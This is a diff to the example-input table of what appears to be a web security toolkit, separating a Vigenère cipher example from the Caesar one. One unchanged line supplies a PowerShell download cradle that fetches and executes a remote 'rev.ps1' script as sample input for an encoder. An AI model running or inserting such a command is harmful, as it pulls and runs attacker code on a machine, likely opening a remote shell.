@@ -53,7 +53,8 @@ const EXAMPLES = {
   'hash': () => { exFill('hash-input', 'P@ssw0rd!2024'); exClick('hash-gen'); },
   'hash-id': () => { exFill('hid-input', '5f4dcc3b5aa765d61d8327deb882cf99'); exClick('hid-id'); },
   'jwt': () => { exFill('jwt-input', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'); exClick('jwt-decode'); },
-  'cipher': () => { exFill('cip-input', 'Attack at dawn'); exFill('cip-shift', '3'); exFill('cip-key', 'LEMON'); exClickText('Caesar'); },
+  'cipher': () => { exFill('cip-input', 'Attack at dawn'); exFill('cip-shift', '3'); exClickText('Caesar'); },
+  'vigenere': () => { exFill('vg-input', 'Attack at dawn'); exFill('vg-key', 'LEMON'); exClickText('Encrypt'); },
   'ps-encode': () => { exFill('pe-in', "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"); },
   'notationer': () => { exFill('not-in', ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n')); },
 
